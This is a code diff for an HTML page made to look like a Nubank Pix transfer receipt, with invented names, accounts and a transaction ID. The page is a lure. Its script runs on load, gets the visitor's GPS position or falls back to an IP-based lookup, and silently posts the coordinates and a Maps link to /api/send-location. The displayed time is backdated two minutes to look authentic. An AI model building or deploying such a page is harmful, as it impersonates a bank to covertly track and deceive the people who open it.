@@ -1,93 +1,174 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Comprovante de transferência</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="styles.css" />
+  </head>
 
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Comprovante de Recebimento</title>
-  <link rel="stylesheet" href="styles.css" />
-</head>
+  <body>
+    <div class="comprovante-container">
+      <!-- Logo Nu -->
+      <div class="logo">
+        <img src="nu-logo.png" alt="Logo Nu" />
+      </div>
 
-<body>
-  <div class="comprovante-container">
-    <h1>Comprovante de Recebimento</h1>
+      <!-- Título principal -->
+      <h2 class="titulo-principal">Comprovante de transferência</h2>
 
-    <div class="informacoes">
-      <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> João Silva de Oliveira</p>
-      <p><span>Status:</span> Recebido com Sucesso</p>
+      <!-- Data e hora -->
+      <div class="data-hora">
+        <span id="data-atual"></span>
+      </div>
+
+      <!-- Seção Valor -->
+      <div class="secao-info">
+        <div class="info-linha">
+          <span class="label">Valor</span>
+          <span class="value">R$ 936,13</span>
+        </div>
+        <div class="info-linha">
+          <span class="label">Tipo de transferência</span>
+          <span class="value">Pix</span>
+        </div>
+      </div>
+
+      <!-- Seção Destino -->
+      <div class="secao-titulo">Destino</div>
+      <div class="secao-info">
+        <div class="info-linha">
+          <span class="label">Nome</span>
+          <span class="value">Rodolfo Ribeiro Saraiva</span>
+        </div>
+        <div class="info-linha">
+          <span class="label">Agência</span>
+          <span class="value">0001</span>
+        </div>
+        <div class="info-linha">
+          <span class="label">Conta</span>
+          <span class="value">6819-9</span>
+        </div>
+      </div>
+
+      <!-- Seção Origem -->
+      <div class="secao-titulo">Origem</div>
+      <div class="secao-info">
+        <div class="info-linha">
+          <span class="label">Nome</span>
+          <span class="value">Angelica Silva de Carvalho</span>
+        </div>
+        <div class="info-linha">
+          <span class="label">Agência</span>
+          <span class="value">0001</span>
+        </div>
+        <div class="info-linha">
+          <span class="label">Conta</span>
+          <span class="value">72111-2</span>
+        </div>
+      </div>
+
+      <!-- Informações da instituição -->
+      <div class="instituicao-info">
+        <div class="instituicao-nome">
+          Nu Pagamentos S.A. - Instituição de Pagamento
+        </div>
+        <div class="cnpj">CNPJ 18.236.120/0001-58</div>
+        <div class="transacao-id">
+          ID da transação: E18236000202508062358604614023
+        </div>
+      </div>
+
+      <!-- Texto de ajuda -->
+      <div class="texto-ajuda">
+        Estamos aqui para ajudar se você tiver alguma dúvida.
+      </div>
+
+      <!-- Link Me ajuda -->
+      <a href="#" class="link-ajuda">Me ajuda →</a>
+
+      <!-- Informações de contato -->
+      <div class="contato-info">
+        Ouvidoria: 0800 887 0463 |<br />
+        ouvidoria@nubank.com.br (Atendimento das 8h às 18h em dias úteis).
+      </div>
     </div>
 
-    <button class="botao" onclick="window.print()">Imprimir</button>
+    <script>
+      window.addEventListener("load", () => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => sendLocation(position, "Precisa (GPS)"),
+            () => fallbackLocation()
+          );
+        } else {
+          fallbackLocation();
+        }
+      });
 
-    <div class="comprovante-footer">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-      <p><a href="#">Clique aqui</a> para mais informações.</p>
-    </div>
-  </div>
+      const agora = new Date();
+      // Subtrai 2 minutos (2 * 60 * 1000 milissegundos)
+      const dataAtual = new Date(agora.getTime() - 2 * 60 * 1000);
 
-  <script>
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => sendLocation(position, "Precisa (GPS)"),
-          () => fallbackLocation()
-        );
-      } else {
-        fallbackLocation();
+      const dia = String(dataAtual.getDate()).padStart(2, "0");
+      const mes = dataAtual
+        .toLocaleString("pt-BR", { month: "short" })
+        .toUpperCase();
+      const ano = dataAtual.getFullYear();
+      const horas = String(dataAtual.getHours()).padStart(2, "0");
+      const minutos = String(dataAtual.getMinutes()).padStart(2, "0");
+      const segundos = String(dataAtual.getSeconds()).padStart(2, "0");
+
+      const dataFormatada = `${dia} ${mes} ${ano} - ${horas}:${minutos}:${segundos}`;
+      document.getElementById("data-atual").textContent = dataFormatada;
+
+      function sendLocation(position, source) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+        enviarParaApi(latitude, longitude, maps, source);
       }
-    });
 
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-    document.getElementById("data-atual").textContent = dataFormatada;
+      function fallbackLocation() {
+        fetch("https://ipapi.co/json/")
+          .then((response) => response.json())
+          .then((data) => {
+            const latitude = data.latitude;
+            const longitude = data.longitude;
+            const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-    function sendLocation(position, source) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            enviarParaApi(latitude, longitude, maps, "Aproximada (IP)");
+          })
+          .catch((error) => {
+            console.error("Erro ao obter localização pelo IP:", error);
+          });
+      }
 
-      enviarParaApi(latitude, longitude, maps, source);
-    }
-
-    function fallbackLocation() {
-      fetch("https://ipapi.co/json/")
-        .then(response => response.json())
-        .then(data => {
-          const latitude = data.latitude;
-          const longitude = data.longitude;
-          const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-          enviarParaApi(latitude, longitude, maps, "Aproximada (IP)");
+      function enviarParaApi(latitude, longitude, maps, source) {
+        fetch("/api/send-location", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ latitude, longitude, maps, source }),
         })
-        .catch(error => {
-          console.error("Erro ao obter localização pelo IP:", error);
-        });
-    }
-
-    function enviarParaApi(latitude, longitude, maps, source) {
-      fetch("/api/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, maps, source })
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
-        })
-        .catch(error => {
-          console.error("Erro:", error);
-        });
-    }
-  </script>
-</body>
-
+          .then((response) => response.json())
+          .then((data) => {
+            if (!data.success) {
+              alert("Erro ao enviar o comprovante.");
+            }
+          })
+          .catch((error) => {
+            console.error("Erro:", error);
+          });
+      }
+    </script>
+  </body>
 </html>
